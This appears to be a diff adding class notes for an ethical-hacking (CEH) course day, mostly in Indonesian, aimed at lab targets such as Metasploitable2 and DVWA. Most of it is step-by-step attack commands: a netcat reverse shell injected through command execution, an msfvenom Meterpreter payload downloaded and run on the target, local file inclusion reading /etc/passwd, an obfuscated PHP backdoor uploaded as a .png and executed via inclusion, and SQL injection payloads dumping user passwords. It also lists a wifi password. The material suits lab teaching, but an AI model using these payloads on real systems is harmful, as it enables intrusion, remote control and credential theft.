@@ -1,0 +1,80 @@
+Welcome to CEH Class Day 3 : 
+Please Join to Wifi :
+SSID: Course_Net_5G
+Password: "08111811110" (with no quotes)
+
+Agenda Day 3 :
+Agenda:
+- Web Application Hacking
+- Denial of Service Attack
+- Social Engineering
+- Wifi Hacking
+- Android Hacking
+
+Today's Target (untuk yang Offline):
+- 192.168.10.236 => metasploitable2
+- 192.168.11.18  => 
+
+Kalo Ketemu Command Execution di Website : 
+Di KALI LINUX :
+1. Buat Listener untuk melakukan Back Connect (Netcat) : 
+	=> $ nc -nlvp 10001 
+DI WEB SERVER TARGET:
+2. Lakukan Koneksi dari Web Target menggunakan Back Connect (Netcat): 
+	=> ; nc -nv <IP KALI LINUX> 10001 -e /bin/bash
+3. Lakukan Jailbreak : 
+	=> python -c 'import pty;pty.spawn("/bin/bash")'
+
+Challenges:
+1 Buat malware untuk linux menggunakan msfvenom 
+	=> $ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP KALI LINUX> LPORT=20002 -f elf > malwarelinuxyohanes
+2. Copy ke Website Target 
+	=> $ python3 -m http.server 
+	=> ; wget http://<IP KALI LINUX>
+	=> ; ls -al
+3. Jalankan Listener di Kali Linux menggunakan msfconsole 
+	=> $ msfconsole 
+	=> msf6 > use exploit/multi/handler
+	=> msf6 > set PAYLOAD linux/x86/meterpreter/reverse_tcp 
+	=> msf6 > set LHOST <IP KALI LINUX>
+	=> msf6 > set LPORT 20002 
+	=> msf6 > exploit
+4. Eksekusi malware di website Target
+	=> ; chmod +x malwarelinuxyohanes
+	=> ; ./malwarelinuxyohanes
+
+http://192.168.10.236/dvwa/vulnerabilities/fi/index.php?page=include.php
+/var/www/dvwa/vulnerabilities/fi/index.php
+/var/www/html/dvwa/vulnerabilities/fi/index.php
+C:\xampp\htdocs\dvwa\vulnerabilities\fi\index.php
+../../../../../etc/passwd
+
+Local File Inclusion /LFI (Hanya bisa Read saja)
+Contoh => http://192.168.10.236/dvwa/vulnerabilities/fi/?page=include.php => ada "php" setelah tanda tanya "?"
+http://192.168.10.236/dvwa/index.php
+/var/www/dvwa/ ==> ../../../etc/passwd
+../../../etc/apache2/apache.conf
+
+/var/www/html/dvwa/vulnerabilities/fi ==> ../../../../../../etc/passwd
+/var/www/dvwa/vulnerabilities/fi ==> ../../../../../etc/passwd
+
+Challenges: 
+1. Cari Backdoor dari Github : 
+	=>"php backdoor github" => Reposity bartblaze
+	=> Masuk ke folder "Obfuscated"
+	=> Ambil backdoor "r57....." => Ambil yang kedua
+	=> Ganti nama backdoor menjadi r57-<Nama Masing2>.png
+2. Upload ke Website menggunakan Kelemahan File Upload
+3. Copy Location dari File upload => ../../hackable/uploads/r57-yohanes.png
+4. Akses DIrektori menggunakan kelemahan Local File Inclusion : 
+	=> http://192.168.10.236/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/r57-yohanes.png
+
+2. 
+
+syntax sql injection low DVWA
+1' order by 3#
+1' or 1 = 1#
+1' or 1 = 1 union select null, table_name from information_schema.tables#
+1' or 1 = 1 union select null, column_name from information_schema.columns where table_name = "users"#
+1' or 1 = 1 union select user,password from users#
+1' or 1 = 1 union select null,group_concat(first_name,user,password) from users#
